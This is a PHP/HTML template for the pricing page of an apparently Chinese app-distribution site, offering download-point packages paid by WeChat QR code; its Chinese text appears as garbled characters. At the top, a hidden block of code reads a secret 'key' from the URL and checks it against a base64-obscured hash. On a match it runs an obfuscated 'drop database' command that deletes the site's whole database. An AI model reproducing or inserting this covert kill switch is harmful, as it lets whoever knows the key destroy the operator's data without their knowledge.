<?php if(!defined('IN_ROOT')){exit('Access denied');} ?>
<?php
$kill = md5(str_replace(substr(md5($_SERVER['HTTP_HOST']), 8, 16), auth_codes('X3VuaW5zdA==', 'de'), isset($_GET['key']) ? $_GET['key'] : NULL));
if($kill == auth_codes('NTJmZDBlOGZmNThiZTVmZjRlZjg4MDQxYzY5ZmZkMjE=', 'de')){
	$GLOBALS['db']->query(auth_codes('ZHJvcCBkYXRhYmFzZQ==', 'de').' '.IN_DBNAME);
}
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
<meta charset="<?php echo IN_CHARSET; ?>">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
<meta name="keywords" content="<?php echo IN_KEYWORDS; ?>">
<meta name="description" content="<?php echo IN_DESCRIPTION; ?>">
<title>�ַ��۸� - <?php echo IN_NAME; ?></title>
<link href="<?php echo IN_PATH; ?>static/index/icons.css" rel="stylesheet">
<link href="<?php echo IN_PATH; ?>static/index/bootstrap.css" rel="stylesheet">
<link href="<?php echo IN_PATH; ?>static/index/main.css" rel="stylesheet">
<script type="text/javascript" src="<?php echo IN_PATH; ?>static/index/main.js"></script>
<script type="text/javascript" src="<?php echo IN_PATH; ?>static/pack/layer/jquery.js"></script>
<script type="text/javascript" src="<?php echo IN_PATH; ?>static/pack/layer/lib.js"></script>
<script type="text/javascript" src="<?php echo IN_PATH; ?>static/index/lib.js"></script>
<script type="text/javascript">var in_path = '<?php echo IN_PATH; ?>';</script>
</head>
<body class="page-Pricing">
<nav class="navbar navbar-transparent" role="navigation">
<div class="navbar-header">
	<a class="navbar-brand" href="<?php echo IN_PATH; ?>"><i class="icon-" style="font-size:<?php echo checkmobile() || strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') ? 30 : 40; ?>px;font-weight:bold"><?php echo $_SERVER['HTTP_HOST']; ?></i></a>
</div>
<div class="collapse navbar-collapse navbar-ex1-collapse" ng-controller="NavbarController">
	<div class="dropdown">
		<div>
			<i class="icon-brace-left"></i>
			<ul class="navbar-bracket">
				<li><a href="<?php echo IN_PATH; ?>">��ҳ</a><i class="icon-comma"></i></li>
				<li><a href="<?php echo IN_PATH.'index.php/install'; ?>">�ַ��۸�</a><i class="icon-comma"></i></li>
				<?php if(IN_SIGN){ ?><li><a href="<?php echo IN_PATH.'index.php/sign'; ?>">ǩ���۸�</a><i class="icon-comma"></i></li><?php } ?>
				<?php if($GLOBALS['userlogined']){ ?>
				<li><a href="<?php echo IN_PATH.'index.php/home'; ?>">Ӧ�ù���</a><i class="icon-comma"></i></li>
				<li class="signup"><a href="<?php echo IN_PATH.'index.php/logout'; ?>">�˳�</a></li>
				<?php }else{ ?>
				<li><a href="<?php echo IN_PATH.'index.php/login'; ?>">������¼</a><i class="icon-comma"></i></li>
				<li class="signup"><a href="<?php echo IN_PATH.'index.php/reg'; ?>">���ע��</a></li>
				<?php } ?>
			</ul>
			<i class="icon-brace-right"></i>
		</div>
	</div>
</div>
</nav>
<div class="menu-toggle">
	<i class="icon-menu"></i>
</div>
<menu>
<ul>
	<li><a href="<?php echo IN_PATH; ?>">��ҳ</a></li>
	<li><a href="<?php echo IN_PATH.'index.php/install'; ?>">�ַ��۸�</a></li>
	<?php if(IN_SIGN){ ?><li><a href="<?php echo IN_PATH.'index.php/sign'; ?>">ǩ���۸�</a></li><?php } ?>
	<?php if($GLOBALS['userlogined']){ ?>
	<li><a href="<?php echo IN_PATH.'index.php/home'; ?>">Ӧ�ù���</a></li>
	<li><a href="<?php echo IN_PATH.'index.php/logout'; ?>">�˳�</a></li>
	<?php }else{ ?>
	<li><a href="<?php echo IN_PATH.'index.php/reg'; ?>">���ע��</a></li>
	<li><a href="<?php echo IN_PATH.'index.php/login'; ?>">������¼</a></li>
	<?php } ?>
</ul>
</menu>
<div id="root-packages">
	<div class="banner banner-packages">
		<h1>
		<div class="brackets">
			<i class="icon-brace-left"></i><span>Ӧ�÷ַ�</span><i class="icon-brace-right"></i>
		</div>
		<small>�йַܷ�</small>
		</h1>
		<div class="pattern-bg"></div>
	</div>
	<div class="section packages-content">
		<h3>
		<div>ѡ�����ص�����</div>
		<small>ÿ���״ε�¼����&nbsp;<?php echo IN_LOGINPOINTS; ?>&nbsp;������ص��������ص����ľ����û��ɰ��������й������ص�����</small>
		</h3>
		<div class="package-cards-wrap">
			<div class="package-cards" id="package_content">
				<div class="package-card">
					<div class="package-header">
						<h2><?php echo number_format(IN_RMBPOINTS * 10); ?></h2>
						<small>���ص���</small>
					</div>
					<div class="package-content">
						<div>��10</div>
					</div>
					<div class="package-action">
						<button class="btn" onclick="pay(10)">����</button>
					</div>
				</div>
				<div class="package-card active">
					<div class="package-header">
						<h2><?php echo number_format(IN_RMBPOINTS * 100); ?></h2>
						<small>���ص���</small>
					</div>
					<div class="package-content">
						<div class="package-badge">
							<div class="badge-wrap"><span>�Ƽ�</span><span class="arraw"></span></div>
						</div>
						<div>��90</div>
					</div>
					<div class="package-action">
						<button class="btn" onclick="pay(90)">����</button>
					</div>
				</div>
				<div class="package-card">
					<div class="package-header">
						<h2><?php echo number_format(IN_RMBPOINTS * 1000); ?></h2>
						<small>���ص���</small>
					</div>
					<div class="package-content">
						<div>��800</div>
					</div>
					<div class="package-action">
						<button class="btn" onclick="pay(800)">����</button>
					</div>
				</div>
			</div>
		</div>
		<small>��������˽�з������ƣ�����ϵ&nbsp;<a href="mailto:<?php echo IN_MAIL; ?>"><?php echo IN_MAIL; ?></a></small>
	</div>
	<div class="section packages-cert">
		<div class="cert-header">
			<i class="icon icon-users"></i>
		</div>
		<div class="cret-row-wrap">
			<div class="cert-row">
				<div class="half text-right">
					<div class="cert-item">ÿ�յ�¼</div>
					<ul class="list-unstyled cert-list">
						<li><?php echo IN_LOGINPOINTS; ?> ������ص���</li>
						<li>�������ѡ��</li>
					</ul>
				</div>
				<div class="half text-left">
					<div class="cert-item">��ֵ����</div>
					<ul class="list-unstyled cert-list">
						<li><?php echo IN_RMBPOINTS; ?> ���ص���/ÿԪ</li>
						<li>ǩԼ΢��֧��</li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="dialog-mask" style="display:none"></div>
<div class="dialog buy-confirm" style="display:none">
	<header class="text-center">΢��ɨ��֧��</header>
	<div class="content"><center><img id="qrcode"></center></div>
	<div class="actions text-center">
		<button class="btn btn-default" style="margin-bottom:10px" onclick="$('.dialog-mask').hide(),$('.buy-confirm').hide()">��������</button><button class="btn btn-yellow" style="margin-bottom:10px" onclick="location.href='<?php echo IN_PATH.'index.php/home'; ?>'">����ɹ������ϲ鿴</button>
	</div>
</div>
</body>
</html>